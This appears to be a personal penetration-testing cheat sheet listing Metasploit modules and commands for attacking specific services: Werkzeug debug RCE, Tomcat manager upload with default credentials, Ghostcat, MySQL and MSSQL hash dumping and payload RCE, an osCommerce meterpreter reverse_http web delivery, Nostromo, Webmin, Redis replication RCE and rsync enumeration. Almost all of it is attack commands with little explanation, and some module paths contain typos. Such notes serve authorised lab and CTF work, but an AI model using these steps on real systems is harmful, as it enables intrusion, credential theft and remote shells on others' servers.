# Exploits

## Werkzeug

```use multi/http/werkzeug+debug_rce```

Gives root

## Apache tomcat manager vuln

prereq

First check that /manager directory is there

```use mult/handler/tomcat_mgr_upload```

default user: tomcat
default password: s3cret

user tomcat

priv

check in ```conf``` directory (might be zipped) and check ```tomcat-users.xml```

## Apache tomcat ghostcat

Check for ajp service running.

Can read sensistive info

```use admin/http/tomcat_ghostcat```

## MySQL

enum with Metasploit

```
use admin/mysql/mysql_enum
use auxiliary/scanner/mysql_version
use scanner/mysql/mysql_hashdump
```

enum with nmap

```nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <IP>```

connect diectly

```
mysql -h <ip> -u <user> -p <password>

SHOW databases;
use <database>
SELECT user,password FROM mysql.user
```

rce

```
use multi/mysql/mysql_udf_payload

set FORCE_UDF_UPLOAD true (needs for the RCE)
set target (default is windows)

may try and open up two meterpreter sessions. cntrl + c to cancel and there should be one meterpreter session
```


## MSSQL

enum with nmap

```nmap --script-args mssql.instance-port=1433,mssql.username=<username (default is sa>,mssql.password=<password>,mssql.instance-name<mssqlserver> -sV -p 1433 --script=ms-sql-brute,ms-sql-dump-hashes,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-empty-password,ms-sql-info <ip>```

enum with metasploit

```
use admin/mssql/mssql_enum
use scanner/mssql/mssql_ping
use scanner/mssql/mssql_login
```

connect directly

```
mssqlclient.py <user>@<ip>

SELECT * FROM information_schema.tables
SELECT name FROM master.dbo.sysdatabases
```

rce

```use windows/mssql/mssql_payload```


## osCommerce2_3_4

```
use multi/script/web_delivery
set payload payload/windows/meterpreter/reverse_http
```

## Nostromo 1.9.6

```use /multi/http/nostromo_code_exec```

## Webmin 1.580

```use unix/webapp/webmin_show_cgi_exec```

## REdis

enum with metasploit

```use gather/redis_extractor```

rce

```use linux/redis/redis_replication_cmd_exec```


## rsync

enum rsync

```
rsync -dt rsync://rsync-connector@<IP>:<port>/<dir>
rsync -a rsync://rsync-connector@<IP>:<port> <dir to save into>
```

with metasploit
```use scanner/rsync/modules_list```

